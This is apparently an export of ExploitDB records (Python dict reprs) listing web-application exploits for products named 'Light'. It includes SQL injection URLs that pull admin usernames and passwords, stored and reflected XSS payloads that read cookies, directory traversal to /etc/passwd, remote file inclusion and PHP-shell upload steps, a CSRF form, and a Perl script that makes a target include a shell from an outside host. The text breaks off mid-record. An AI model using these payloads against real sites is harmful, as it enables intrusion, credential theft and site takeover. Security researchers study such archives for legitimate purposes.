{u'code': u'Exploit Code:\r\n\r\nvictim/path/home/index.asp?w=pages&r=9999999 union select all 0,username,null,0x1 from admin\r\n\r\nvictim/path/home/index.asp?w=pages&r=9999999 union select all 0,password,null,0x1 from admin\r\n\r\nhttp://localhost:2222/lab/cms/_admin\r\n\r\nDownload:http://login.fipsasp.com/File.asp?ID=60&CatID=5\r\nFound By U238\r\n# Exploit Search Find: ^o)\r\n#\r\n# fipsCMS light - \xc3\u201a\xc2\xa9 fipsASP 2003 - 2008. All rights reserved\r\n#\r\n# fipsCMS light - \xc3\u201a\xc2\xa9 fipsASP 2003 - 2008\r\n#\r\n# inurl:"fipsASP 2003 - 2008"\r\n# ************************************************ \r\n\r\n# milw0rm.com [2008-07-26]', u'description': u"FipsCMS Light 2.1 - 'r' SQL Injection", u'platform': u'asp', u'author': u'U238', u'cve': [], u'source': u'ExploitDB', u'date': u'2008-07-26T00:00:00+00:00', u'_id': 6135, u'type': u'webapps', u'port': 0}

CVE: []
Description: Ultra Light Forum - Persistent Cross-Site Scripting
{u'code': u'# Ultra Light Forum Persistant XSS Vulnerability\r\n# By cr4wl3r http://bastardlabs.info\r\n# http://bastardlabs.info/advisories/?id=86\r\n# Script: http://sourceforge.net/projects/ultralightforum/files/\r\n# Tested: Win 7\r\n\r\nDescription :\r\nUltra Light Forum developed in PHP and MySQL as a standalone forum with high speed, high user-friendliness. \r\nUser can create, delete topic, can reply to others topic. \r\nThe forum also comes with poll, where user can vote. To know more try UL Forum.\r\n\r\nProof of Concept :\r\nChoose profile settings, and put the messages box with \r\n<script>alert(document.cookie)</script>\r\nAnd update your profile\r\nSo if any user can view you profile, the script will be execute\r\n\r\nDemo:\r\nhttp://bastardlabs.info/demo/ultraforum1.png\r\nhttp://bastardlabs.info/demo/ultraforum2.png', u'description': u'Ultra Light Forum - Persistent Cross-Site Scripting', u'platform': u'php', u'author': u'cr4wl3r', u'cve': [], u'source': u'ExploitDB', u'date': u'2013-02-14T00:00:00+00:00', u'_id': 24501, u'type': u'webapps', u'port': 0}

CVE: []
Description: Subdreamer 1.0 - SQL Injection
{u'code': u'source: http://www.securityfocus.com/bid/12839/info\r\n\r\nSubdreamer is prone to an SQL injection vulnerability.\r\n\r\nBecause of this, a malicious user may influence database queries in order to view or modify sensitive information, potentially compromising the software or the database.\r\n\r\nSubdreamer Light is reported to be affected by this issue. All versions of Subdreamer Light are considered to be vulnerable at the moment. \r\n\r\nhttp://www.example.com/index.php?categoryid=3&p17_sectionid=1&p17_imageid=[SQL code]', u'description': u'Subdreamer 1.0 - SQL Injection', u'platform': u'php', u'author': u'GHC team', u'cve': [], u'source': u'ExploitDB', u'date': u'2005-03-18T00:00:00+00:00', u'_id': 25235, u'type': u'webapps', u'port': 0}

CVE: []
Description: dsm light Web file browser 2.0 - Directory Traversal
{u'code': u'source: http://www.securityfocus.com/bid/10381/info\r\n\r\nDSM Light has been reported to be prone to a directory traversal vulnerability. This issue is due to a failure of the application to properly sanitize user-supplied URI input.\r\n\r\nThis issue would allow an attacker to view arbitrary, web-readable files on the affected computer. This may aid an attacker in conducting further attacks against the vulnerable computer.\r\n\r\nhttp://www.example.com/htmlarea/popups/explorer.php?wdir=/../../../../../../../../../../etc', u'description': u'dsm light Web file browser 2.0 - Directory Traversal', u'platform': u'php', u'author': u'Humberto', u'cve': [], u'source': u'ExploitDB', u'date': u'2004-05-18T00:00:00+00:00', u'_id': 24131, u'type': u'webapps', u'port': 0}

CVE: []
Description: GA's Forum Light - 'Archive.asp' SQL Injection
{u'code': u"source: http://www.securityfocus.com/bid/16563/info\r\n\r\nGA's Forum Light is prone to an SQL-injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.\r\n\r\nSuccessful exploitation could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation. \r\n\r\nhttp://www.example.com/forum/archive.asp?Forum=Test+Forum%5F1%2D13%2D2004%5F11%2D28%2D2004&pages='\r\nhttp://www.example.com/forum/archive.asp?Forum='%20or%20'='%5F1%2D13%2D2004%5F11%2D28%2D2004&pages=4", u'description': u"GA's Forum Light - 'Archive.asp' SQL Injection", u'platform': u'asp', u'author': u'Dj_Eyes', u'cve': [], u'source': u'ExploitDB', u'date': u'2006-02-07T00:00:00+00:00', u'_id': 27174, u'type': u'webapps', u'port': 0}

CVE: []
Description: MyBace Light - 'login_check.php' Remote File
{u'code': u'+--------------------------------------------------------------------\r\n+\r\n+ MyBace Light (hauptverzeichniss) Remote File Inclusion\r\n+\r\n+ Original advisory:\r\n+ http://www.bb-pcsecurity.de/Websecurity/384/MyBace_Light_(hauptverzeichniss)_Remote_File_Inclusion.htm\r\n+--------------------------------------------------------------------\r\n+\r\n+ Affected Software .: My Bace Light\r\n+ Venedor ...........: http://www.onlinemacher.de/\r\n+ Class .............: Remote File Inclusion\r\n+ Risk ..............: high (Remote File Execution)\r\n+ Found by ..........: Philipp Niedziela\r\n+ Contact ...........: webmaster[at]bb-pcsecurity[.]de\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ Affected Files:\r\n+  includes/login_check.php\r\n+           var: $hauptverzeichniss\r\n+\r\n+  admin/login/content/user_daten.php\r\n+           var: $template_back\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ $hauptverzeichniss & $template_back is not properly sanitized before being used\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ Solution:\r\n+ Deny direct access to these files using a .htaccess-file\r\n+ or modify code:\r\n+\r\n+ if(!isset($_REQUEST[\'hauptverzeichniss\']) &&\r\n!isset($_GET[\'hauptverzeichniss\'])\r\n+     && !isset($_POST[\'hauptverzeichniss\'])){\r\n+ //code of org. *.php\r\n+ }\r\n+ else {\r\n+ echo "You cannot access this file directly.";\r\n+ die();\r\n+ }\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ PoC:\r\n+\r\n+ http://[target]/includes/login_check.php?hauptverzeichniss=[shell]\r\n+\r\n+--------------------------------------------------------------------\r\n+\r\n+ Notice: I\'ve tried to contact venedor 3 weeks ago, but no answer yet...\r\n+\r\n+\r\n+ Greets: /str0ke\r\n+\r\n+-------------------------[ E O F ]----------------------------------\r\n\r\n# milw0rm.com [2006-09-01]', u'description': u"MyBace Light - 'login_check.php' Remote File", u'platform': u'php', u'author': u'Philipp Niedziela', u'cve': [], u'source': u'ExploitDB', u'date': u'2006-09-01T00:00:00+00:00', u'_id': 2285, u'type': u'webapps', u'port': 0}

CVE: []
Description: doorGets CMS - Cross-Site Request Forgery
{u'code': u'# Title: Doorgets CSRF Vulnerability\r\n# Author: n0pe\r\n# Software Link: http://www.doorgets.com/\r\n# Download: http://www.doorgets.com/?sources_cms\r\n# Tested: BackBox Linux 3\r\n\r\nWith this vulnerability you can change the configuration of the site.\r\n\r\n\r\nProof of concept:\r\n\r\n<html>\r\n\t<body>\r\n\t\t<form name="csrf" method="post" action="http://localhost/door/admin/?r=config&siteweb">\r\n\t\t\tTitle <input type="text" id="website_title" name="website_title" value="Owned"><br />\r\n\t\t\tSlogan <input type="text" id="website_slogan" name="website_slogan" value="Owned"><br />\r\n\t\t\tDescription <input type="text" id="website_description" name="website_description" value="Owned"><br />\r\n\t\t\tCopyright <input type="text" id="website_copyright" name="website_copyright" value="lol"><br />\r\n\t\t\tYear of creation <input  type="text" id="website_year" name="website_year" value="2013"><br />\r\n\t\t\tKeywords <input type="text" id="website_keywords" name="website_keywords" value="Owned"><br />\r\n\t\t\tID Facebook <input type="text" id="website_id_facebook" name="website_id_facebook" value=""> <br />\r\n\t\t\tDisqus <input  type="text" id="website_id_disqus" name="website_id_disqus" value=""> <br />\r\n\t\t\t<input type="radio" name="website_theme"  id="website_theme_doorgets-home"  value="doorgets-home" doorgets-light >doorgets-home<br />                                    \r\n\t\t\t<input type="radio" name="website_theme"  id="website_theme_doorgets-light"  value="doorgets-light" checked="checked" >doorgets-light<br />          \r\n\t\t\t<input type="submit" id="website_submit" name="website_submit" value="Save">\r\n\t\t</form>\r\n\t</body>\r\n</html>', u'description': u'doorGets CMS - Cross-Site Request Forgery', u'platform': u'php', u'author': u'n0pe', u'cve': [], u'source': u'ExploitDB', u'date': u'2013-03-01T00:00:00+00:00', u'_id': 24560, u'type': u'webapps', u'port': 0}

CVE: []
Description: CMS Papoo 6.0.0 Rev. 4701 - Persistent Cross-Site Scripting
{u'code': u"Advisory: Persistent XSS Vulnerability in CMS Papoo Light v6\r\nAdvisory ID: SROEADV-2014-01\r\nAuthor: Steffen R\xf6semann\r\nAffected Software: CMS Papoo Version 6.0.0 Rev. 4701\r\nVendor URL: http://www.papoo.de/\r\nVendor Status: fixed\r\nCVE-ID: -\r\n\r\n==========================\r\nVulnerability Description:\r\n==========================\r\n\r\nThe CMS Papoo Light Version has a persistent XSS vulnerability in its guestbook functionality and in its user-registration functionality.\r\n\r\n==================\r\nTechnical Details:\r\n==================\r\n\r\nXSS-Vulnerability #1:\r\n\r\nPapoo Light CMS v6 provides the functionality to post comments on a guestbook via the following url: http://{target-url}/guestbook.php?menuid=6.\r\n\r\nThe input fields with the id \u201eauthor\u201c is vulnerable to XSS which gets stored in the database and makes that vulnerability persistent.\r\n\r\nPayload-Examples:\r\n\r\n<img src='n' onerror=\u201cjavascript:alert('XSS')\u201c >\r\n<iframe src=\u201csome_remote_source\u201c></iframe>\r\n\r\nXSS-Vulnerability #2:\r\n\r\nPeople can register themselves on Papoo Light v6 CMS at http://{target-url}/account.php?menuid=2. Instead of using a proper username, an attacker can inject HTML and/or JavaScriptcode on the username input-field.\r\n\r\nCode gets written to the database backend then. Attacker only has to confirm his/her e-mail address to be able to login and spread the code by posting to the forum or the guestbook where the username is displayed.\r\n\r\nPayload-Examples:\r\n\r\nsee above (XSS #1)\r\n\r\n=========\r\nSolution:\r\n=========\r\n\r\nUpdate to the latest version\r\n\r\n====================\r\nDisclosure Timeline:\r\n====================\r\n13-Dec-2014 \u2013 found XSS #1\r\n13-Dec-2014 - informed the developers (XSS #1)\r\n14-Dec-2014 \u2013 found XSS #2\r\n14-Dec-2014 \u2013 informed the developers (XSS #2)\r\n15-Dec-2014 - release date of this security advisory\r\n15-Dec-2014 - response and fix by vendor\r\n15-Dec-2014 - post on BugTraq\r\n\r\n========\r\nCredits:\r\n========\r\n\r\nVulnerability found and advisory written by Steffen R\xf6semann.\r\n\r\n===========\r\nReferences:\r\n===========\r\n\r\nhttp://www.papoo.de/\r\nhttp://sroesemann.blogspot.de", u'description': u'CMS Papoo 6.0.0 Rev. 4701 - Persistent Cross-Site Scripting', u'platform': u'php', u'author': u'Steffen R\xf6semann', u'cve': [], u'source': u'ExploitDB', u'date': u'2014-12-16T00:00:00+00:00', u'_id': 35551, u'type': u'webapps', u'port': 80}

CVE: []
Description: iScripts AutoHoster - 'main_smtp.php' Traversal
{u'code': u'source: http://www.securityfocus.com/bid/64377/info\r\n    \r\niScripts AutoHoster is prone to multiple security vulnerabilities because it fails to sufficiently sanitize user-supplied data.\r\n    \r\nAn attacker can exploit these vulnerabilities to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database, to execute arbitrary commands or script code in the context of the application, and obtain sensitive information that may aid in further attacks.\r\n    \r\n/support/parser/main_smtp.php\r\n^\r\nJust light sandwitch before the fatty food :))', u'description': u"iScripts AutoHoster - 'main_smtp.php' Traversal", u'platform': u'php', u'author': u'i-Hmx', u'cve': [], u'source': u'ExploitDB', u'date': u'2013-12-15T00:00:00+00:00', u'_id': 38889, u'type': u'webapps', u'port': 0}

CVE: []
Description: Papoo CMS Light 4.0 - Multiple Cross-Site Scripting Vulnerabilities
{u'code': u'source: http://www.securityfocus.com/bid/49587/info\r\n\r\nPapoo CMS Light is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.\r\n\r\nAn attacker may leverage these issues to execute arbitrary HTML and script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.\r\n\r\nPapoo CMS Light 4.0 is vulnerable; other versions may also be affected. \r\n\r\nhttp://www.example.com/papoo/papoo_light/index.php/"></a><script>alert(document.cookie);</script>\r\nhttp://www.example.com/papoo/papoo_light/kontakt.php/"></a><script>alert(document.cookie);</script>\r\nhttp://www.example.com/papoo/papoo_light/inhalt.php/"></a><script>alert(document.cookie);</script>\r\nhttp://www.example.com/papoo/papoo_light/forum.php/"></a><script>alert(document.cookie);</script>\r\nhttp://www.example.com/papoo/papoo_light/guestbook.php/"></a><script>alert(document.cookie);</script>\r\nhttp://www.example.com/papoo/papoo_light/account.php/"></a><script>alert(document.cookie);</script>\r\nhttp://www.example.com/papoo/papoo_light/login.php/"></a><script>alert(document.cookie);</script>\r\nhttp://www.example.com/papoo/papoo_light/index/"></a><script>alert(document.cookie);</script>\r\nhttp://www.example.com/papoo/papoo_light/forumthread.php/"></a><script>alert(document.cookie);</script>\r\nhttp://www.example.com/papoo/papoo_light/forum/"></a><script>alert(document.cookie);</script>', u'description': u'Papoo CMS Light 4.0 - Multiple Cross-Site Scripting Vulnerabilities', u'platform': u'php', u'author': u'Stefan Schurtz', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-09-12T00:00:00+00:00', u'_id': 36131, u'type': u'webapps', u'port': 0}

CVE: []
Description: Puntal 2.1.0 - Remote File Inclusion
{u'code': u"====================================================\r\nPuntal 2.1.0 Remote File Inclusion Vulnerability\r\n====================================================\r\n\r\n1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0\r\n0     _                   __           __       __                     1\r\n1   /' \\            __  /'__`\\        /\\ \\__  /'__`\\                   0\r\n0  /\\_, \\    ___   /\\_\\/\\_\\ \\ \\    ___\\ \\ ,_\\/\\ \\/\\ \\  _ ___           1\r\n1  \\/_/\\ \\ /' _ `\\ \\/\\ \\/_/_\\_<_  /'___\\ \\ \\/\\ \\ \\ \\ \\/\\`'__\\          0\r\n0     \\ \\ \\/\\ \\/\\ \\ \\ \\ \\/\\ \\ \\ \\/\\ \\__/\\ \\ \\_\\ \\ \\_\\ \\ \\ \\/           1\r\n1      \\ \\_\\ \\_\\ \\_\\_\\ \\ \\ \\____/\\ \\____\\\\ \\__\\\\ \\____/\\ \\_\\           0\r\n0       \\/_/\\/_/\\/_/\\ \\_\\ \\/___/  \\/____/ \\/__/ \\/___/  \\/_/           1\r\n1                  \\ \\____/ >> Exploit database separated by exploit   0\r\n0                   \\/___/          type (local, remote, DoS, etc.)    1\r\n1                                                                      1\r\n0  [+] Site            : Inj3ct0r.com                                  0\r\n1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1\r\n0                                                                      0\r\n1                    ########################################          1\r\n0                    I'm eidelweiss member from Inj3ct0r Team          1\r\n1                    ########################################          0\r\n0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1\r\n\r\nDownload:\thttp://sourceforge.net/projects/puntal/files/\r\n\r\nAuthor: \t\tidelweiss\r\nContact:\t\teidelweiss[at]cyberservices.com\r\nThank`s:\t\tr0073r & 0x1D (inj3ct0r) , JosS , exploit-db team , [D]eal [C]yber\r\nGreetz:\t\tall inj3ctor Team, yogyacarderlink Team, devilzc0de & all INDONESIAN HACKER`s\r\n\r\n========================================================================\r\n\r\nDescription:\r\n\r\nPuntal is a free project under GNU/GPL Licence.\r\nPuntal is a LCMS (Light Content Management System) to the opposite of big and heavy CMS, Puntal is light and powerful.\r\nPuntal is a MOD of PunBB : which mean that you have to install PunBB first of all\r\nPuntal is a LCMS (Light Content Management System) for the famous PunBB forum software.\r\nPuntal will never changes anything in the core of PunBB, and is always in total respect of the W3C standard.\r\nWhat currently proposes Puntal :\r\n\r\n    * no modification of the files of PunBB is necessary to install Puntal;\r\n    * ten standard modules (news, download, calendar, articles, directory, planet, lexicon, bug traker, blog, search engine) ;\r\n    * the news module can use static (to be faster than query the database each time) or dynamic to display the data in real times ;\r\n    * a dozen of blocs to enable/disable to fit your needs ;\r\n    * a plugin system to add easyly blocs and modules and possibility to import/export easyly thoses plugins ;\r\n    * a Puntal control panel like the punBB one ;\r\n    * use of the style sheets of PunBB for a perfect integration between the portal and the forums ;\r\n    * multilanguage ;\r\n    * installation script ;\r\n    * and more ...\r\n\t\r\n\t\r\ncopyright 2007 - http://www.puntal.fr\r\n\r\n========================================================================\r\n\r\n\t-=[ VULN C0de ]=-\r\n\r\n[-] index.php\r\n\r\n************************************************************************/\r\n\r\n# APPLICATION PATH\r\n\r\n# Path to the root of the application (if you move this file)\r\n$app_path = '/';\r\n\r\n# If for example you put index.php at the root of your site and that Puntal\r\n# is in /puntal you can uncomment the following line: \r\n\r\n// $app_path = '/puntal/';\r\n\r\n\r\n#------------------------------------------------------------------------\r\n# \t\t\tDO NOT CHANGE ANYTHING AFTER THIS LINE\r\n#------------------------------------------------------------------------\r\n\r\n$puntal_path = dirname(__FILE__).$app_path;\r\n\r\nrequire $puntal_path.'inc/public/prepend.php';\r\n\r\n\r\n========================================================================\r\n\r\n\t-=[ P0C ]=-\r\n\r\n\thttp://127.0.0.1//path/index.php?app_path=[inj3ct0r sh3ll]\r\n\t\t\tor\r\n\thttp://127.0.0.1//path/index.php?puntal_path=[inj3ct0r sh3ll]\r\n\r\n=========================| -=[ E0F ]=- |=================================", u'description': u'Puntal 2.1.0 - Remote File Inclusion', u'platform': u'php', u'author': u'eidelweiss', u'cve': [], u'source': u'ExploitDB', u'date': u'2010-04-30T00:00:00+00:00', u'_id': 12466, u'type': u'webapps', u'port': 0}

CVE: []
Description: CompactCMS 1.4.0 - 'tiny_mce' Arbitrary File Upload
{u'code': u"##########################################################\r\n#Title: CompactCMS 1.4.0 (tiny_mce) Remote File Upload\r\n#Vendor: http://www.compactcms.nl/\r\n##########################################################\r\n#AUTHOR: ITSecTeam\r\n#Email: Bug@ITSecTeam.com\r\n#Website: http://www.itsecteam.com\r\n#Forum : http://forum.ITSecTeam.com\r\n#Original Advisory: www.ITSecTeam.com/en/vulnerabilities/vulnerability52.htm\r\n#Thanks: r3dm0v3, pejvak, am!rkh@n\r\n##########################################################\r\n\r\n#DESCRIPTION (by vendor):#################################\r\nCompactCMS might just be the tenth CMS you considered using for your website.\r\nIf that's true, ask yourself why you haven't found the right Content\r\nManagement\r\nSystem just yet. CompactCMS is light-weight, truly efficient and fully\r\nAjax loaded.\r\n\r\n#POC:#####################################################\r\nhttp://site.com/admin/includes/tiny_mce/plugins/\r\ntinybrowser/upload.php", u'description': u"CompactCMS 1.4.0 - 'tiny_mce' Arbitrary File Upload", u'platform': u'php', u'author': u'ITSecTeam', u'cve': [], u'source': u'ExploitDB', u'date': u'2010-05-15T00:00:00+00:00', u'_id': 12613, u'type': u'webapps', u'port': 0}

CVE: []
Description: Videos Tube 1.0 - Multiple SQL Injections
{u'code': u'# Exploit Title: Videos Tube SQL Injection and Remote Code Execution\r\n# Google Dork: inurl:"single.php?url=" video\r\n# Date: 05.05.2014\r\n# Exploit Author: Mustafa ALTINKAYNAK\r\n# Vendor Homepage: http://www.phpscriptlerim.com\r\n# Software Link: http://demo.phpscriptlerim.com/free/videostube/\r\n# Version: 1.0\r\n\r\nDescription (A\xe7\u0131klama)\r\n========================\r\nCategory, showing video on the page are two types of SQL injection. Boolean-based blind and AND / OR time-based blind. Incoming data can be filtered off light.\r\n\r\nVulnerability\r\n========================\r\n1) videocat.php?url=test\' AND 3383=3383 AND \'ODau\'=\'ODau (with SQLMAP Tool)\r\n2) single.php?url=test\' AND 3383=3383 AND \'ODau\'=\'ODau (with SQLMap Tool)', u'description': u'Videos Tube 1.0 - Multiple SQL Injections', u'platform': u'php', u'author': u'Mustafa ALTINKAYNAK', u'cve': [], u'source': u'ExploitDB', u'date': u'2014-05-26T00:00:00+00:00', u'_id': 33514, u'type': u'webapps', u'port': 80}

CVE: []
Description: LightBlog 9.5 - 'cp_upload_image.php' Arbitrary File Upload
{u'code': u' LightBlog 9.5 - REMOTE FILE UPLOAD VULNERABILITY\r\nby Omni\r\n1) Infos\r\n---------\r\nDate : 2008-01-30\r\nProduct : LightBlog\r\nVersion : v 9.5\r\nVendor : http://www.publicwarehouse.co.uk/\r\nVendor Status :\r\n2008-01-31 Informed!\r\n2008-01-31 Patch received from vendor!\r\n2008-02-01 Published!\r\n\r\n\r\nDescription : Lightblog provides webmasters who don\'t have SQL databases with a fully featured blogging system. Using\r\ntext files to store data, there\'s no need for complicated installation procedures or a potentially pricey\r\nhosting bill.\r\nDork : "Powered by LightBlog" - Powered by LightBlog\r\nSource : omnipresent - omni - http://omni.netsons.org\r\n\r\nE-mail : omnipresent[at]NOSPAMemail[dot]it - omni[at]NOSPAMplayhack[dot]\r\nTeam : Playhack.net Security\r\n\r\n\r\n2) Security Issues\r\n-------------------\r\n\r\n\r\n--- [ Remote File Upload Vulnerability ] ---\r\n===============================================\r\nA remote file upload vulnerability is present in LightBlog version 9.5.\r\nUsers without permissions are able to upload any kind of files, also .php; so the attacker can upload their own remote PHP\r\nshell.\r\nThe file vulnerable is: cp_upload_image.php, and you can find it under the root directory of the blog uploaded. (shown\r\nin the section PoC).\r\n\r\n\r\n--- [ PoC ] ---\r\n===============\r\nhttp://localhost/light/cp_upload_image.php\r\nJust look for your PHP shell, upload it (shell.php) and then use it:\r\nhttp://localhost/light/images/shell.php\r\n\r\n\r\n--- [ Patch ] ---\r\n===============\r\n- Edit the source code.\r\n- use CHMOD\r\n- Delete cp_upload_image.php\r\n- Use the vendor patch.\r\n\r\nBest Regards,\r\n/Omni\r\n\r\n# milw0rm.com [2008-02-01]', u'description': u"LightBlog 9.5 - 'cp_upload_image.php' Arbitrary File Upload", u'platform': u'php', u'author': u'Omni', u'cve': [], u'source': u'ExploitDB', u'date': u'2008-02-01T00:00:00+00:00', u'_id': 5033, u'type': u'webapps', u'port': 0}

CVE: []
Description: APT-webshop 3.0/4.0 - 'modules.php' Multiple SQL Injections
{u'code': u'source: http://www.securityfocus.com/bid/17425/info\r\n\r\nAPT-webshop is prone to multiple SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query. \r\n\r\nA successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.\r\n\r\nAPT-webshop 3.0 light, 3.0 basic, and 4.0 pro are reported prone to these issues. Other versions may be vulnerable as well.\r\n\r\nhttp://www.example.com/modules.php?warp=artikel&group=[SQL]\r\nhttp://www.example.com/modules.php?warp=artikel&group=&seite=[SQL]\r\nhttp://www.example.com/modules.php?warp=artikel&group=&seite=&id=[SQL]', u'description': u"APT-webshop 3.0/4.0 - 'modules.php' Multiple SQL Injections", u'platform': u'php', u'author': u'r0t', u'cve': [], u'source': u'ExploitDB', u'date': u'2005-04-10T00:00:00+00:00', u'_id': 27590, u'type': u'webapps', u'port': 0}

CVE: []
Description: Mini-CMS / News Script Light 1.0 - Remote File Inclusion
{u'code': u'#!/usr/bin/perl\r\n#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n# mini CMS / News Script Light 1.0 Remote File Include Exploit\r\n#\r\n# Bug found and exploit written by bd0rk || SOH-Crew\r\n#\r\n# Vendor: http://www.hinnendahl.com/\r\n#\r\n# Downloadsite: http://www.hinnendahl.com/index.php?seite=download\r\n#\r\n# Description: The script_pfad parameter in news_base.php isn\'t declared before require\r\n#\r\n# Contact: bd0rk[at]hackermail.com\r\n# Website: www.soh-crew.it.tt\r\n#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nuse Getopt::Long;\r\n\r\nuse URI::Escape;\r\n\r\nuse IO::Socket;\r\n\r\n$shellcode = "http://yourshellsite.com";\r\n\r\nmain();\r\n\r\nsub usage\r\n{\r\n\r\nprint "\\mini CMS / News Script Lite 1.0 Remote File Include Exploit\\n";\r\nprint "Bug found and Exploit written by bd0rk\\n";\r\nprint "-1, --target\\ttarget\\t(yourhost.com)\\n";\r\nprint "-2, --shellpath\\tshell\\t(http://yourshellsite.com)\\n";\r\nprint "-3, --dir\\tDirectory\\t(/news_system)\\n";\r\nexit;\r\n\r\n}\r\n\r\nsub main\r\n{\r\n\r\nGetOptions (\'1|target=s\' => \\$target, \'2|shellpath=s\' => \\$shellpath,\'3|dir=s\' => \\$dir);\r\nusage() unless $target;\r\n$shellcode = $shellpath unless !$shellpath;\r\n$targethost = uri_escape($shellcode);\r\n\r\n$socket = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$target",PeerPort=>"80") or die "\\nConnection() Failed.\\n";\r\n\r\nprint "\\nConnected to ".$target.", Attacking host...\\n";\r\n$bd0rk = "inst=true&ins_file=".$target."";\r\n$soh = lenght($bd0rk);\r\n\r\nprint $socket "POST ".$dir."/news_system/news_base.php?script_pfad= HTTP/1.1\\n";\r\nprint $socket "Target: ".$target."\\n";\r\nprint $socket "Connection: close\\n";\r\nprint $socket "Content-Type: application/x-www-form-urlencoded\\n";\r\nprint $socket "Content-Lenght: ".$soh."\\n\\n";\r\nprint $socket $soh;\r\nprint "Server-Response:\\n\\n";\r\n{\r\n\r\nprint " ".$recvd."";\r\n}\r\n\r\nexit;\r\n\r\n}', u'description': u'Mini-CMS / News Script Light 1.0 - Remote File Inclusion', u'platform': u'php', u'author': u'bd0rk', u'cve': [], u'source': u'ExploitDB', u'date': u'2010-08-26T00:00:00+00:00', u'_id': 14808, u'type': u'webapps', u'port': 0}

CVE: []
Description: OneFileCMS 1.1.5 - Local File Inclusion
{u'code': u'# Exploit Title: OneFileCMS v.1.1.5 Local File Inclusion Vulnerability\r\n# Google Dork: --\r\n# Date: 16/03/2012\r\n# Author: mr.pr0n (@_pr0n_)\r\n# Homepage: http://ghostinthelab.wordpress.com/ - http://s3cure.gr\r\n# Software Link: https://github.com/rocktronica/OneFileCMS\r\n# Version: OneFileCMS v.1.1.5\r\n# Tested on: Linux Fedora 14\r\n\r\n===============\r\nDescription\r\n===============\r\nOneFileCMS is just that. It\'s a flat, light, one file CMS (Content\r\nManagement System) entirely contained in an easy-to-implement, highly\r\ncustomizable, database-less PHP script. Coupling a utilitarian code editor\r\nwith all the basic necessities of an FTP application, OneFileCMS can\r\nmaintain a whole website completely in-browser without any external\r\nprograms.\r\n\r\n=======================================================\r\n[!] All vulnerabilities requires authentication. [!]\r\n=======================================================\r\n\r\n\r\nDirectory Listing, using the "i" parameter:\r\nhttp://TARGET/onefilecms/onefilecms.php?i=../../../../\r\n\r\n\r\nRead local files, using the "f" parameter:\r\nhttp://TARGET/onefilecms/onefilecms.php?f=../../../../etc/passwd\r\nhttp://TARGET/onefilecms/onefilecms.php?f=../../../../var/www/html/onefilecms/onefilecms.php\r\n\r\n-- \r\nhttp://ghostinthelab.wordpress.com', u'description': u'OneFileCMS 1.1.5 - Local File Inclusion', u'platform': u'php', u'author': u'mr.pr0n', u'cve': [], u'source': u'ExploitDB', u'date': u'2012-03-16T00:00:00+00:00', u'_id': 18607, u'type': u'webapps', u'port': 0}

CVE: []
Description: Joomla! Component JE Ajax Event Calendar 1.0.5 - SQL Injection
{u'code': u'Exploit Title:Joomla JE Ajax event calendar SQL Vulnerable \r\nVersion:1.0.5\r\nAuthor: L0rd CrusAd3r aka VSN [crusader_hmg@yahoo.com]\r\nPublished: 2010-06-23\r\nGreetz to:r0073r (inj3ct0r.com), Sid3^effects, MaYur, MA1201, Sonic Bluehat.\r\nSpecial Greetz: Topsecure.net, inj3ct0r Team\r\nShoutzz:- To all ICW members.\r\n~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~\r\nDescription:\r\n\r\n100% MVC structure follow. There are three different managers in that\r\ncomponent:-\r\n\r\n1. Category Management\r\n2. Event Management\r\n3. Event Setting\r\n\r\n1. Category Management: - Admin can add, edit, delete, published and unpublished the category title and description.\r\n\r\n2. Event Management: - Admin can add, edit, delete, published and unpublished the event. Event title, category, start date, end date, description, background color and text color add, edit and delete, published, unpublished from the event management.\r\nAdmin has rights that all users or selected user or none can see the event from front end.\r\nAdmin can add event to selected category.\r\n\r\n3. Setting: - Admin can enable or disable all the events which user can add the event or not.\r\nAdmin can set the header1, header2, header3, header4 color using color picker.\r\n\r\nFeatures:-\r\n\r\n- Add event to particular category\r\n- Set the calendar color using color picker.\r\n- Admin has rights to add event from site side.\r\n- Admin has rights that all users see the event or selected user can see the events.\r\n- Front end side user can see the event description in light box by click on that event.\r\n~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~~*~*~*~*~*~*~\r\n\r\nVulnerability:\r\n\r\n*SQL Vulnerability\r\n\r\nDEMO URL :\r\n\r\nhttp://server/component/jeeventcalendar/?view=[Sqli]\r\n\r\n# 0day n0 m0re #\r\n# L0rd CrusAd3r #', u'description': u'Joomla! Component JE Ajax Event Calendar 1.0.5 - SQL 